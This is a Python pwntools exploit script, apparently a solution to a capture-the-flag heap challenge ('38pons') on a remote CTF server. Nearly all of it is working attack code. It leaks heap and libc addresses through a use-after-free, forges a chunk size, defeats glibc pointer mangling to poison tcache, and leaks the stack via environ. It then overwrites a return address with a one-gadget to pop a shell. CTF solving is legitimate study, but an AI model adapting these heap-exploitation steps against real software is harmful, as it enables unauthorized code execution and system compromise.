#!/usr/bin/env python3

from pwn import *

fmt = logging.Formatter("%(funcName)s -> %(message)s")

sh = logging.StreamHandler()
sh.setLevel(logging.DEBUG)
sh.setFormatter(fmt)

logger = logging.getLogger("randpon")
logger.addHandler(sh)
logger.setLevel(logging.INFO)

run_str = './38pons'
p: process = None

exe = ELF(run_str)
libc = ELF('./libc.so.6')
ld = ELF('./ld-ver.so')

context.binary = exe

args.LOCAL = 0
args.DEBUG = 0

def demangle(obfus_ptr): 
	o2 = (obfus_ptr >> 12) ^ obfus_ptr
	return (o2 >> 24) ^ o2

def mangle(addr, value):
    return (addr >> 12) ^ value

def itb(numeric):
    return str(numeric).encode('ascii')

def bti(bytes_data):
    return int(bytes_data.decode('ascii'))

def conn():
    global p
    if args.LOCAL:
        p = process([run_str])
        if args.DEBUG:
            p = gdb.debug([run_str])
    else:
        p = remote("pwn.vkctf2023.ru", 4338)

    return p

def allocate(data: bytes | str = b"DDDD"):
    if isinstance(data, str):
        data = data.encode("latin1")
    p.sendlineafter(b">>> ", b"1")
    p.sendlineafter(b"How much PONs: ", itb(len(data)))
    p.sendafter(b"PON it: ", data)

def free(pos: int):
    p.sendlineafter(b">>> ", b"3")
    p.sendlineafter(b"What PON block data you want to delete: ", itb(pos))

def read(pos: int):
    p.sendlineafter(b">>> ", b"2")
    p.sendlineafter(b"What PON block data you want to see: ", itb(pos))
    p.recvuntil(b"Your PON data: ")
    afterword = b"\n\nChoose"
    block_data = p.recvuntil(afterword)[:-len(afterword)]
    return block_data
    
def change(pos: int, data: bytes | str = b"DDDD"):
    if isinstance(data, str):
        data = data.encode("latin1")
    p.sendlineafter(b">>> ", b"4")
    p.sendlineafter(b"What PON block data you want to change: ", itb(pos))
    p.sendlineafter(b"How much PONs: ", itb(len(data)))
    p.sendafter(b"PON it: ", data)

LIBC_BASE_TO_ARENA_OFFSET = 0x1d8b20
LIBC_BASE_TO_ENVIRON_OFFSET = 0x1e0078

BWD = "b *((char *)&writeData + 0x160)"
BM = "b *((char *)&main + 0xd5)"

def main():
    conn()
    allocate() # 0 <- heap leak
    free(0)
    heap_bytes_leak = read(0)
    heap_base = u64(heap_bytes_leak[:8]) << 12
    heap_key = u64(heap_bytes_leak[8:16])
    logger.info("Heap base: 0x%x", heap_base)
    logger.info("Heap key: 0x%x", heap_key)
    allocate() # 1 <- to free and rewrite
    allocate() # 2 <- libc leak
    for _ in range(17): # 3 - 19
        allocate()
    
    free(1)
    allocate(0x38 * b"A" + p16(0x441)) # 20
    free(2)
    libc_bytes_leak = read(2)
    libc_base = u64(libc_bytes_leak[:8]) - LIBC_BASE_TO_ARENA_OFFSET
    logger.info("Libc leak 0x%x", libc_base)

    for i in range(3, 3 + 14): # free 3 - 16
        free(i)
    
    change(3 + 7, p64(mangle(heap_base, libc_base + LIBC_BASE_TO_ENVIRON_OFFSET - 40)))

    for _ in range(8): # 21 - 28
        allocate()

    for i in range(17, 17 + 7): # free 17 - 23
        free(i)

    allocate("A") # 29
    environ_bytes_leak = read(29)
    environ = u64(environ_bytes_leak[24:32])
    logger.info("Environ 0x%x", environ)

    change(17, p64(mangle(heap_base, environ - 0x168)))

    logger.info("Stack allocation 0x%x", environ - 0x168)

    for _ in range(7): # 30 - 36
        allocate()

    allocate(b"A" * 8 + p64(0) + p64(0) + p64(libc_base + 0x4f403))
    p.interactive()


if __name__ == "__main__":
    main()
